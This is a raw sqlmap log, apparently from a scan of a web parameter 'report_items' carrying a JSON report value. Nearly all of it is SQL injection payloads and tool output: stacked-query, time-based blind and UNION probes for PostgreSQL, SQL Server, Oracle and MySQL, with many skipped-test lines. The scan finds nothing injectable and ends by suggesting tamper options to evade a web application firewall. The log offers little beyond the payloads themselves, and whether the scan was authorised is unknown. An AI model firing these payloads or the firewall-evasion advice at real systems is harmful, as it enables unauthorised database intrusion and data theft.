[16:22:04] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]);SELECT PG_SLEEP(5)--

[16:22:04] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}];SELECT PG_SLEEP(5)--

[16:22:04] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]');SELECT PG_SLEEP(5)--

[16:22:04] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]';SELECT PG_SLEEP(5)--

[16:22:04] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries' because the level (4) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc - comment)' because the level (3) is higher than the provided (1)

[16:22:04] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc)' because the level (5) is higher than the provided (1)

[16:22:04] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'

[16:22:04] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]);WAITFOR DELAY '0:0:5'--

[16:22:04] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}];WAITFOR DELAY '0:0:5'--

[16:22:04] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]');WAITFOR DELAY '0:0:5'--

[16:22:04] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]';WAITFOR DELAY '0:0:5'--

[16:22:05] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)' because the level (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries' because the level (4) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE)' because the level (5) is higher than the provided (1)

[16:22:05] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(121)||CHR(112)||CHR(117)||CHR(72),5) FROM DUAL--

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}];SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(121)||CHR(112)||CHR(117)||CHR(72),5) FROM DUAL--

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(121)||CHR(112)||CHR(117)||CHR(72),5) FROM DUAL--

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(121)||CHR(112)||CHR(117)||CHR(72),5) FROM DUAL--

[16:22:05] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)' because the level (4) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'Oracle stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'Oracle stacked queries (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)' because the level (4) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP)' because the level (5) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP - comment)' because the level (5) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP)' because the level (5) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'Firebird stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'Firebird stacked queries (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]) AND (SELECT 8002 FROM (SELECT(SLEEP(5)))TGoU) AND (5779=5779

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND (SELECT 8002 FROM (SELECT(SLEEP(5)))TGoU)

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]') AND (SELECT 8002 FROM (SELECT(SLEEP(5)))TGoU) AND ('adbR'='adbR

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]' AND (SELECT 8002 FROM (SELECT(SLEEP(5)))TGoU) AND 'niof'='niof

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND (SELECT 8002 FROM (SELECT(SLEEP(5)))TGoU)-- ssMc

[16:22:05] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' because the risk (3) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP)' because the level (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' because the risk (3) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)' because the level (3) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)' because the risk (3) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)' because the level (3) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)' because the risk (3) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)' because the risk (3) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)' because the risk (3) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind' because the level (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (comment)' because the level (4) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)' because the level (3) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)' because the level (4) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL AND time-based blind (ELT)' because the level (3) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL OR time-based blind (ELT)' because the risk (3) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL AND time-based blind (ELT - comment)' because the level (5) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'MySQL OR time-based blind (ELT - comment)' because the risk (3) is higher than the provided (1)

[16:22:05] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]) AND 3711=(SELECT 3711 FROM PG_SLEEP(5)) AND (5971=5971

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND 3711=(SELECT 3711 FROM PG_SLEEP(5))

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]') AND 3711=(SELECT 3711 FROM PG_SLEEP(5)) AND ('gInP'='gInP

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]' AND 3711=(SELECT 3711 FROM PG_SLEEP(5)) AND 'eQVb'='eQVb

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND 3711=(SELECT 3711 FROM PG_SLEEP(5))-- PgFJ

[16:22:05] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind' because the risk (3) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind (comment)' because the level (4) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind (comment)' because the risk (3) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:05] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:05] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]) WAITFOR DELAY '0:0:5' AND (4279=4279

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] WAITFOR DELAY '0:0:5'

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]') WAITFOR DELAY '0:0:5' AND ('Opxj'='Opxj

[16:22:05] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]' WAITFOR DELAY '0:0:5' AND 'MADN'='MADN

[16:22:06] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] WAITFOR DELAY '0:0:5'-- YapM

[16:22:06] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF - comment)' because the level (4) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:06] [INFO] testing 'Oracle AND time-based blind'

[16:22:06] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]) AND 1352=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(68)||CHR(103),5) AND (4539=4539

[16:22:06] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND 1352=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(68)||CHR(103),5)

[16:22:06] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]') AND 1352=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(68)||CHR(103),5) AND ('fhjO'='fhjO

[16:22:06] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]' AND 1352=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(68)||CHR(103),5) AND 'gxLY'='gxLY

[16:22:06] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] AND 1352=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(68)||CHR(103),5)-- SjrA

[16:22:06] [DEBUG] skipping test 'Oracle OR time-based blind' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Oracle AND time-based blind (comment)' because the level (4) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Oracle OR time-based blind (comment)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Informix AND time-based blind (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Informix OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Informix AND time-based blind (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Informix OR time-based blind (heavy query - comment)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'ClickHouse AND time-based blind (heavy query)' because the level (4) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'ClickHouse OR time-based blind (heavy query)' because the risk (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace' because the level (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' because the level (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (bool)' because the level (4) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (ELT)' because the level (5) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (MAKE_SET)' because the level (5) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - Parameter replace' because the level (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'PostgreSQL time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)' because the level (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)' because the level (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (heavy queries)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Firebird time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'SAP MaxDB time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'IBM DB2 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Informix time-based blind - Parameter replace (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)' because the level (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)' because the level (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the risk (2) is higher than the provided (1)

[16:22:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'

[16:22:06] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]) ORDER BY 1-- ChCq

[16:22:06] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] ORDER BY 1-- EDNt

[16:22:06] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]') ORDER BY 1-- tTpq

[16:22:06] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}]' ORDER BY 1-- IcYK

[16:22:06] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1001,"code":0,"apiname":"pcappboardreport","message":"","cost":174}] ORDER BY 1-- YkYh

[16:22:06] [DEBUG] skipping test 'Generic UNION query (random number) - 1 to 10 columns' because the level (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Generic UNION query (NULL) - 11 to 20 columns' because the level (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Generic UNION query (random number) - 11 to 20 columns' because the level (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Generic UNION query (NULL) - 21 to 30 columns' because the level (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Generic UNION query (random number) - 21 to 30 columns' because the level (4) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Generic UNION query (NULL) - 31 to 40 columns' because the level (4) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Generic UNION query (random number) - 31 to 40 columns' because the level (5) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Generic UNION query (NULL) - 41 to 50 columns' because the level (5) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'Generic UNION query (random number) - 41 to 50 columns' because the level (5) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL UNION query (NULL) - 1 to 10 columns' because the level (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL UNION query (random number) - 1 to 10 columns' because the level (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL UNION query (NULL) - 11 to 20 columns' because the level (2) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL UNION query (random number) - 11 to 20 columns' because the level (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL UNION query (NULL) - 21 to 30 columns' because the level (3) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL UNION query (random number) - 21 to 30 columns' because the level (4) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL UNION query (NULL) - 31 to 40 columns' because the level (4) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL UNION query (random number) - 31 to 40 columns' because the level (5) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL UNION query (NULL) - 41 to 50 columns' because the level (5) is higher than the provided (1)

[16:22:06] [DEBUG] skipping test 'MySQL UNION query (random number) - 41 to 50 columns' because the level (5) is higher than the provided (1)

[16:22:06] [WARNING] GET parameter 'report_items' does not seem to be injectable

[16:22:06] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target

[16:22:06] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'C:\Users\LYZ\AppData\Local\sqlmap\output\results-04082024_0421pm.csv'



[*] ending @ 16:22:06 /2024-04-08/

